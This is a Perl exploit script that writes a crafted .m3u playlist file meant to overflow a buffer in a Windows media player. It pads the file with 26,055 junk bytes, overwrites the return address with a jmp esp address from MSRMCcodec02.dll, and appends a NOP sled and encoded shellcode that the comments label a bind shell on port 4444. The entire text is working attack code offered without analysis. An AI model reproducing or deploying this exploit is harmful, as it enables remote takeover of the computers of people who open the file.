my $file= "crash8.m3u";
my $junk= "A" x 26055;
# jmp esp from MSRMCcodec02.dll
my $eip = pack('V',0x01B1B22A);  

my $shellcode = "\x90" x 25; 

# Encoder: x86/fnstenv_mov
# Payload: windows/exec
# Payload size: 350 bytes
# EXITFUNC=seh, LPORT=4444
# Payload: windows/shell_bind_tcp
$shellcode = $shellcode."\x6a\x52\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x83" .
"\x98\xb5\xb7\x83\xeb\xfc\xe2\xf4\x7f\x70\x37\xb7\x83\x98" .
"\xd5\x3e\x66\xa9\x75\xd3\x08\xc8\x85\x3c\xd1\x94\x3e\xe5" .
"\x97\x13\xc7\x9f\x8c\x2f\xff\x91\xb2\x67\x19\x8b\xe2\xe4" .
"\xb7\x9b\xa3\x59\x7a\xba\x82\x5f\x57\x45\xd1\xcf\x3e\xe5" .
"\x93\x13\xff\x8b\x08\xd4\xa4\xcf\x60\xd0\xb4\x66\xd2\x13" .
"\xec\x97\x82\x4b\x3e\xfe\x9b\x7b\x8f\xfe\x08\xac\x3e\xb6" .
"\x55\xa9\x4a\x1b\x42\x57\xb8\xb6\x44\xa0\x55\xc2\x75\x9b" .
"\xc8\x4f\xb8\xe5\x91\xc2\x67\xc0\x3e\xef\xa7\x99\x66\xd1" .
"\x08\x94\xfe\x3c\xdb\x84\xb4\x64\x08\x9c\x3e\xb6\x53\x11" .
"\xf1\x93\xa7\xc3\xee\xd6\xda\xc2\xe4\x48\x63\xc7\xea\xed" .
"\x08\x8a\x5e\x3a\xde\xf0\x86\x85\x83\x98\xdd\xc0\xf0\xaa" .
"\xea\xe3\xeb\xd4\xc2\x91\x84\x67\x60\x0f\x13\x99\xb5\xb7" .
"\xaa\x5c\xe1\xe7\xeb\xb1\x35\xdc\x83\x67\x60\xdd\x8b\xc1" .
"\xe5\x55\x7e\xd8\xe5\xf7\xd3\xf0\x5f\xb8\x5c\x78\x4a\x62" .
"\x14\xf0\xb7\xb7\x92\xc4\x3c\x51\xe9\x88\xe3\xe0\xeb\x5a" .
"\x6e\x80\xe4\x67\x60\xe0\xeb\x2f\x5c\x8f\x7c\x67\x60\xe0" .
"\xeb\xec\x59\x8c\x62\x67\x60\xe0\x14\xf0\xc0\xd9\xce\xf9" .
"\x4a\x62\xeb\xfb\xd8\xd3\x83\x11\x56\xe0\xd4\xcf\x84\x41" .
"\xe9\x8a\xec\xe1\x61\x65\xd3\x70\xc7\xbc\x89\xb6\x82\x15" .
"\xf1\x93\x93\x5e\xb5\xf3\xd7\xc8\xe3\xe1\xd5\xde\xe3\xf9" .
"\xd5\xce\xe6\xe1\xeb\xe1\x79\x88\x05\x67\x60\x3e\x63\xd6" .
"\xe3\xf1\x7c\xa8\xdd\xbf\x04\x85\xd5\x48\x56\x23\x4b\xb9" .
"\xb1\x72\xdd\x11\x16\x25\x28\x48\x56\xa4\xb3\xcb\x89\x18" .
"\x4e\x57\xf6\x9d\x0e\xf0\x90\xea\xda\xdd\x83\xcb\x4a\x62";

open($FILE,">$file");
print $FILE $junk.$eip.$shellcode;
close($FILE);
print "m3u File Created successfully\n";

